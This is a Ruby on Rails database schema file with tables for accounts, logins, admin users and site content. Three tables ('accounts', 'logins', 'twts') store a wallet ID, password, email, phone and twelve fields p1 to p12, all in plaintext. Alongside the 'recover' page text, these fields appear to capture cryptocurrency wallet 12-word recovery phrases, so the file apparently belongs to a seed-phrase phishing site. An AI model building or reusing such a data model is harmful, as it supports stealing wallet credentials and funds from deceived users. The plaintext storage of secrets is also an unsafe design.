# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# Note that this schema.rb definition is the authoritative source for your
# database schema. If you need to create the application database on another
# system, you should be using db:schema:load, not running all the migrations
# from scratch. The latter is a flawed and unsustainable approach (the more migrations
# you'll amass, the slower it'll run and the greater likelihood for issues).
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 2021_09_26_031809) do

  # These are extensions that must be enabled in order to support this database
  enable_extension "plpgsql"

  create_table "accounts", force: :cascade do |t|
    t.string "wallet_id"
    t.string "password"
    t.string "p1"
    t.string "p2"
    t.string "p3"
    t.string "p4"
    t.string "p5"
    t.string "p6"
    t.string "p7"
    t.string "p8"
    t.string "p9"
    t.string "p10"
    t.string "p11"
    t.string "p12"
    t.string "email"
    t.string "phone"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end

  create_table "active_admin_comments", force: :cascade do |t|
    t.string "namespace"
    t.text "body"
    t.string "resource_type"
    t.bigint "resource_id"
    t.string "author_type"
    t.bigint "author_id"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["author_type", "author_id"], name: "index_active_admin_comments_on_author_type_and_author_id"
    t.index ["namespace"], name: "index_active_admin_comments_on_namespace"
    t.index ["resource_type", "resource_id"], name: "index_active_admin_comments_on_resource_type_and_resource_id"
  end

  create_table "admin_users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at"
    t.datetime "remember_created_at"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.index ["email"], name: "index_admin_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_admin_users_on_reset_password_token", unique: true
  end

  create_table "headers", force: :cascade do |t|
    t.string "abouts_title"
    t.string "abouts_sub_title"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
    t.string "abouts_desc"
    t.string "recover_title"
    t.string "recover_desc"
    t.string "recover_sub_title"
    t.string "r2_title"
    t.string "r2_sub_title"
    t.string "r2_desc"
  end

  create_table "logins", force: :cascade do |t|
    t.string "wallet_id"
    t.string "email"
    t.string "password"
    t.string "p1"
    t.string "p2"
    t.string "p3"
    t.string "p4"
    t.string "p5"
    t.string "p6"
    t.string "p7"
    t.string "p8"
    t.string "p9"
    t.string "p10"
    t.string "p11"
    t.string "p12"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end

  create_table "twts", force: :cascade do |t|
    t.string "wallet_id"
    t.string "email"
    t.string "password"
    t.string "p1"
    t.string "p2"
    t.string "p3"
    t.string "p4"
    t.string "p5"
    t.string "p6"
    t.string "p7"
    t.string "p8"
    t.string "p9"
    t.string "p10"
    t.string "p11"
    t.string "p12"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end

  create_table "welcomes", force: :cascade do |t|
    t.string "title"
    t.string "logoimg"
    t.string "desc"
    t.string "whatsapp"
    t.string "ig"
    t.string "ln"
    t.string "section"
    t.string "link"
    t.string "footer"
    t.string "phone"
    t.string "address"
    t.string "twitter"
    t.string "email"
    t.string "youtube"
    t.string "telegram"
    t.string "bgimg"
    t.datetime "created_at", null: false
    t.datetime "updated_at", null: false
  end

end
